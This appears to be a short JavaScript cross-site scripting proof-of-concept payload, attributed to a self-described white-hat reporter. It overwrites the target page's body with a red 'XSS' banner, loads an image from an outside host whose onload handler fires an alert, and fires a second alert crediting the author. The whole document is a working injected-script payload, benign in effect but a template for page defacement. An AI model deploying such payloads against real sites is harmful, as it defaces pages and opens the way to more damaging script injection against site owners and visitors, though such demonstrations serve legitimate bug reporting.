var main = document.implementation.createDocument('http://www.w3.org/1999/xhtml', 'html', null);
var body = main.createElement("body");
main.documentElement.appendChild(body);
setTimeout(function() {    
  document.body.innerHTML = "<style>h1 {color:red}</style><h1>Sudhamshu XSS!!! :~D</h1><br><h4><img src='//web-safety.net/whitehat.png' onload=\x22alert('Oops!\\n\\n\\n\\x20XSS!\\n\\n\\n:~D\\n\\n\\nAuthor\\x20\\x26\\x20Reporter:\\x20Sudhamshu\\x20BN')\x22>";
},10)
setTimeout(function(){ alert('XSS!\n\nby: Sudhamshu B N') },100)
